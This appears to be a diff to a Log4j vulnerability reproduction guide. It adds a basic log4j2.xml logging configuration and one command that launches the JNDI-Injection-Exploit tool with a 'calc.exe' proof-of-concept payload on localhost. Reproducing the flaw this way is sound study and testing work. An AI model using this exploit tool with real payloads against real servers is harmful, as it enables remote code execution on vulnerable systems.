@@ -1,3 +1,4 @@
+
 ```
 <dependencies>
 <dependency>
@@ -30,4 +31,27 @@ public class MyApp {
     }
 }
 ```
+log4j2.xml
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<Configuration status="WARN">
+    <Appenders>
+        <Console name="Console" target="SYSTEM_OUT">
+            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
+        </Console>
+    </Appenders>
+    <Loggers>
+        <Root level="info">
+            <AppenderRef ref="Console"/>
+        </Root>
+    </Loggers>
+</Configuration>
+```
+
+
+```
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A 127.0.0.1
+```
+
+
 
